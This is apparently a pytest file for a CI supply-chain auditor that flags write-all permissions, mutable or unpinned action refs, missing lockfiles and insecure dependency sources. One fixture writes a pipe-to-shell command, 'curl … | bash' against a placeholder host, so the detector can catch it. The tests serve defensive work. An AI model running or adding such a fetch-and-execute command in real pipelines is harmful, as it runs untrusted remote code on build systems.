from pathlib import Path

from sgoda.integration.spt0247l2.audit import SupplyChainLayer2Auditor
from sgoda.integration.spt0247l2.service import SupplyChainLayer2Service


def write(path: Path, text: str):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")


def control_map(root, workflows=None, deps=None):
    result = SupplyChainLayer2Service(root, workflows or [], deps or []).assess()
    return {c["control_id"]: c for c in result["controls"]}, result


def test_empty_scope_passes():
    _, result = control_map(Path("."), [], [])
    assert result["status"] == "SUPPLY_CHAIN_LAYER2_GATE_PASS"


def test_write_all_blocks(tmp_path):
    p = ".github/workflows/a.yml"
    write(tmp_path / p, "permissions: write-all\n")
    controls, _ = control_map(tmp_path, [p], [])
    assert controls["SC2-WRITE-ALL"]["passed"] is False


def test_main_action_blocks(tmp_path):
    p = ".github/workflows/a.yml"
    write(tmp_path / p, "steps:\n  - uses: owner/action@main\n")
    controls, _ = control_map(tmp_path, [p], [])
    assert controls["SC2-ACTIONS-MUTABLE"]["passed"] is False


def test_version_tag_is_advisory(tmp_path):
    p = ".github/workflows/a.yml"
    write(tmp_path / p, "steps:\n  - uses: actions/checkout@v4\n")
    controls, result = control_map(tmp_path, [p], [])
    assert controls["SC2-ACTIONS-SHA"]["passed"] is False
    assert controls["SC2-ACTIONS-SHA"]["blocking"] is False
    assert result["status"] == "SUPPLY_CHAIN_LAYER2_GATE_PASS"


def test_sha_action_passes(tmp_path):
    p = ".github/workflows/a.yml"
    sha = "0123456789abcdef0123456789abcdef01234567"
    write(tmp_path / p, f"steps:\n  - uses: actions/checkout@{sha}\n")
    controls, _ = control_map(tmp_path, [p], [])
    assert controls["SC2-ACTIONS-SHA"]["passed"] is True


def test_pipe_to_shell_blocks(tmp_path):
    p = ".github/workflows/a.yml"
    write(tmp_path / p, "steps:\n  - run: curl https://x.invalid/a.sh | bash\n")
    controls, _ = control_map(tmp_path, [p], [])
    assert controls["SC2-DANGEROUS-RUN"]["passed"] is False


def test_http_dependency_blocks(tmp_path):
    p = "requirements.txt"
    write(tmp_path / p, "pkg @ http://x.invalid/pkg.whl\n")
    controls, _ = control_map(tmp_path, [], [p])
    assert controls["SC2-DEPENDENCY-SOURCE"]["passed"] is False


def test_unpinned_vcs_blocks(tmp_path):
    p = "requirements.txt"
    write(tmp_path / p, "git+https://github.com/x/y.git\n")
    controls, _ = control_map(tmp_path, [], [p])
    assert controls["SC2-DEPENDENCY-SOURCE"]["passed"] is False


def test_package_json_without_lock_blocks(tmp_path):
    p = "package.json"
    write(tmp_path / p, '{"name":"x"}\n')
    controls, _ = control_map(tmp_path, [], [p])
    assert controls["SC2-LOCKFILE"]["passed"] is False


def test_package_json_with_lock_passes(tmp_path):
    p1 = "package.json"
    p2 = "package-lock.json"
    write(tmp_path / p1, '{"name":"x"}\n')
    write(tmp_path / p2, '{"lockfileVersion":3}\n')
    controls, _ = control_map(tmp_path, [], [p1, p2])
    assert controls["SC2-LOCKFILE"]["passed"] is True


def test_pubspec_without_lock_blocks(tmp_path):
    p = "pubspec.yaml"
    write(tmp_path / p, "name: x\n")
    controls, _ = control_map(tmp_path, [], [p])
    assert controls["SC2-LOCKFILE"]["passed"] is False


def test_no_execution_side_effects(tmp_path):
    _, result = control_map(tmp_path, [], [])
    assert result["workflow_executed"] is False
    assert result["package_installed"] is False
    assert result["release_published"] is False
    assert result["secret_values_exposed"] is False
